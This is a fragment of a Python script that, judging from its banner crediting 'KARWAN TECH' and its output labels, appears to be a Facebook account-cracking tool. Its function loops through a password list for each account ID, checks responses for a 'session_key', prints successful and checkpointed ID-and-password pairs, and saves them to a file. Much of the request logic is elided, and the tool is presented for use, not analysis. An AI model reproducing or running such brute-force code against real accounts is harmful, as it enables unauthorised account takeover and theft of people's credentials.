...
\__|  \__|\__|  \__|\__|  \__|\__/     \__|\__|  \__|\__|  \__|
                                                 \033[1;97mX MURTAZA                                  
----------------------------------------------
AUTHER    :  MURTAZA BAGHLANI
TEAM :  KARWAN TECH
BROTHER ❤️: MURTAZA XD BARIE💜
Facebook :MURTAZA BAGHLANI
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [KARWAN]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [KARWAN-OK] '+uid+' | '+pas)
                        ...
                        file_path = os.path.join(folder_path, 'KARWAN-CP.txt')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [KARWAN-CP] '+uid+' | '+pas+'\033[1;97m')
